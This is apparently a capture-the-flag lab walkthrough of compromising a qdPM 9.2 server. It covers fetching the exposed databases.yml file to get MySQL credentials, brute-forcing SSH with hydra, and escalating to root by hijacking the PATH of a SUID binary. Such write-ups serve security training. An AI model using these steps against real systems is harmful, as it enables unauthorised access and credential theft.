We can see that there is ssh, mysql and http running on the server. Let’s go ahead and check the website since we’ll need credentials for mysql and ssh.

We come across a login page for qdPM. There aren’t any default credentials for this service. So let’s look for any exploits for the qdPM 9.2 version.

```bash
# Exploit Title: qdPM 9.2 - DB Connection String and Password Exposure (Unauthenticated)
# Date: 03/08/2021
# Exploit Author: Leon Trappett (thepcn3rd)
# Vendor Homepage: https://qdpm.net/
# Software Link: https://sourceforge.net/projects/qdpm/files/latest/download
# Version: 9.2
# Tested on: Ubuntu 20.04 Apache2 Server running PHP 7.4

The password and connection string for the database are stored in a yml file. To access the yml file you can go to http://<website>/core/config/databases.yml file and download.
```

We manage to find the above exploit. Let’s go ahead and download the databases.yml file

```bash
all:
  doctrine:
    class: sfDoctrineDatabase
    param:
      dsn: 'mysql:dbname=qdpm;host=localhost'
      profiler: false
      username: qdpmadmin
      password: "<?php echo urlencode('UcVQCMQk2STVeS6J') ; ?>"
      attributes:
        quote_identifier: true  
  
```

We seem to have found credentials for the mysql service

qdpmadmin:UcVQCMQk2STVeS6J

Let’s log on to the mysql service and perform some enumeration there.

```bash
MySQL [(none)]> show databases;

We can see some Users and Passwords encoded in base64. We can’t seem to read any file using the load_file() function. So it seems we will have to create a wordlist of users and passwords based on what we have above.

```bash
hydra -L user.txt -P pass.txt 192.168.56.136 ssh -t 4

We are able to find two users. Let’s ssh into the server using one of them.

![2](https://github.com/user-attachments/assets/396fdf5d-38e6-4ae4-bb08-1d282ae97a2b)


We are able to get the user.txt from the travis user. Let’s also go ahead and login using dexter to see what else is there.

![3](https://github.com/user-attachments/assets/6a144677-95db-4bd9-99b5-6c19d9f79e05)


There is this note there. Let’s enumerate the system and see what we can find.

![4](https://github.com/user-attachments/assets/4bd76178-6e06-43bf-b553-b9e2b79b0988)


We are able to find a binary with the suid bit set on. Let’s analyze this executable on our machine to see what it does.

```bash
ltrace ./get_access 
setuid(0)                                                                                                                                         = -1
setgid(0)                                                                                                                                         = -1
system("cat /root/system.info"cat: /root/system.info: Permission denied

socket(2, 1, 0)                                                                                                                                   = 3
puts("All services are disabled. Acces"...All services are disabled. Accessing to the system is allowed only within working hours.

)                                                                                                       = 90
+++ exited (status 0) +++

```

It seem that the binary is calling the cat command to print a file. Since it is calling cat without using the absolute path I think we can do a path export attack on it.

Sure enough we do get root.
